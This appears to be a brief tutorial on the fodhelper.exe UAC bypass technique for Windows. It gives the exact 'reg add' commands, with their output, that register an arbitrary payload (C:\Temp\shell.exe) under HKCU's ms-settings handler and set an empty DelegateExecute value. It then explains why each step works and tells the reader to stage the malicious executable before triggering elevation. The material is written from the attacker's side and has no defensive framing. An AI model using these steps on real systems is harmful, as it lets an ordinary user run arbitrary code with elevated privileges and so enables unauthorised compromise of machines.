fodhelper.exe Bypass: Registry Modification

Preparing the Attack Vector from a Standard User Shell

# 1. Verify initial privileges (standard user)
C:\Users\StandardUser> whoami /groups
...
Group Name: None
...
# 2. Add malicious command to HKCU registry
C:\Users\StandardUser> reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /ve /d "C:\Temp\shell.exe" /f
The operation completed successfully.
# 3. Add DelegateExecute value
C:\Users\StandardUser> reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /d "" /f
The operation completed successfully.
Key Takeaway

By modifying HKCU, a standard user can instruct fodhelper.exe to execute an arbitrary payload with elevated privileges.

Why HKCU?

The HKEY_CURRENT_USER (HKCU) hive is crucial because it's one of the few Registry areas where a standard user has write permissions. This allows us to inject our malicious command.

The DelegateExecute Flag

Setting DelegateExecute to an empty string is a specific trick. It forces fodhelper.exe to execute the command specified in the default value of the Registry key, rather than its own internal logic.

Payload Placement

Ensure your malicious executable (e.g., shell.exe) is placed in a location accessible by the target system, such as C:\Temp\, before executing the bypass.
